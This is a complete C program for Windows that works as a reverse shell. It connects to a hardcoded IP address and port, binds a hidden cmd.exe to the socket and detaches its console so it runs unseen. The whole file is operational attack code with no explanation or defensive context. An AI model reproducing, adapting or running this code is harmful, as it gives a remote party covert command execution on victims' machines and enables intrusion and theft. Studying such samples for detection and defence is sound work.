#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h> 

#define TARGET_IP "192.168.8.10" 
#define TARGET_PORT 5555
void silent_exit() {
    WSACleanup();
    exit(EXIT_FAILURE); 
}

void reverseConnect();

void startup_cmd(SOCKET sockfd) {
    STARTUPINFOA si;         
    PROCESS_INFORMATION pi; 
    
    HANDLE hStdIn  = (HANDLE)sockfd;
    HANDLE hStdOut = (HANDLE)sockfd;
    HANDLE hStdErr = (HANDLE)sockfd;

    if (!SetHandleInformation(hStdIn, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT) ||
        !SetHandleInformation(hStdOut, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT) ||
        !SetHandleInformation(hStdErr, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT)) {
        closesocket(sockfd);
        silent_exit();
    }
    
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    si.dwFlags = (STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES);
    si.wShowWindow = SW_HIDE; 
    
    si.hStdInput = hStdIn;
    si.hStdOutput = hStdOut;
    si.hStdError = hStdErr;

    if (!CreateProcessA(NULL,             
                       "cmd.exe",        
                       NULL,             
                       NULL,             
                       TRUE,             
                       0,                
                       NULL,             
                       NULL,             
                       &si,              
                       &pi))             
    {
        closesocket(sockfd);
        silent_exit();
    }
    
    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

void reverseConnect() {
    WSADATA wsaData;
    SOCKET sockfd = INVALID_SOCKET;
    struct sockaddr_in server_addr;
    
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) { silent_exit(); }
    if ((sockfd = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0)) == INVALID_SOCKET) { silent_exit(); } 
     
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(TARGET_PORT); 
    server_addr.sin_addr.s_addr = inet_addr(TARGET_IP);
    
    if (server_addr.sin_addr.s_addr == INADDR_NONE) { closesocket(sockfd); silent_exit(); }

    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        closesocket(sockfd);
        silent_exit(); 
    }
    
    startup_cmd(sockfd);
    
    closesocket(sockfd);
    WSACleanup();
}

int main() {
    FreeConsole();
    reverseConnect();
    return 0;
}
